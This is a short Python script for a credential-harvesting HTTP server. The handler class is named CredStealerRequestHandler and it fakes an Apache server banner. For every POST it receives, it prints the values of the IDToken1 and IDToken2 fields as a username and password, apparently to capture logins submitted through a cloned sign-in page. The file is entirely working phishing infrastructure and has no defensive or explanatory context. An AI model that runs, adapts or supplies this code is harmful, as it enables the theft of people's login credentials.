#!/usr/bin/python3

import http.server
import http
import json
import urllib.parse
import argparse

class CredStealerRequestHandler(http.server.BaseHTTPRequestHandler):
    server_version = "Apache/2.4.9 (Linux)"
    def do_POST(self):
        print('!!!!!! NEW Post Request Recieved !!!!')
        data_string = self.rfile.read(int(self.headers["Content-Length"]))
        self.send_response(http.HTTPStatus.OK)
        self.end_headers()
        real_data = urllib.parse.parse_qs(data_string.decode("utf-8"))
        print('username: ' + real_data["IDToken1"][0])
        print('password: ' + real_data["IDToken2"][0])
    def do_GET(self):
        pass


parser = argparse.ArgumentParser()
parser.add_argument('port', action='store',
                    default=8000, type=int,
                    nargs='?',
                    help='Specify alternate port [default: 8000]')
args = parser.parse_args()

server_addr = ('', args.port)
server = http.server.HTTPServer(server_addr, CredStealerRequestHandler)
server.serve_forever()
